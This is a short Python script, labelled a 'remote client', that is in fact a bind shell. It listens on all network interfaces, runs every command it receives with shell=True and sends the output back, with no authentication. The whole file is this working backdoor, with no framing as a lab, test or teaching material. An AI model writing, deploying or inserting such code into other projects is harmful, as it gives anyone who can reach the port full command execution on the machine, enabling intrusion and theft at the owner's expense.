
import argparse
import socket
import subprocess

def process_command(cmd):
    try:
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            check=False,
            shell=True
        )
        if result.stderr:
            return f'Error: {result.stderr}'
        return result.stdout

    except Exception as e:
        return f'Error: {e}'


def start_server(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', port))
        s.listen()
        
        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(1024)
                if not data:
                    break
                command = data.decode('utf-8')
                response = process_command(command)
                conn.sendall(response.encode('utf-8'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="remote client")


    parser.add_argument(
        '--port',
        type=int,
        default=8080
    )

    args = parser.parse_args()

    start_server(args.port)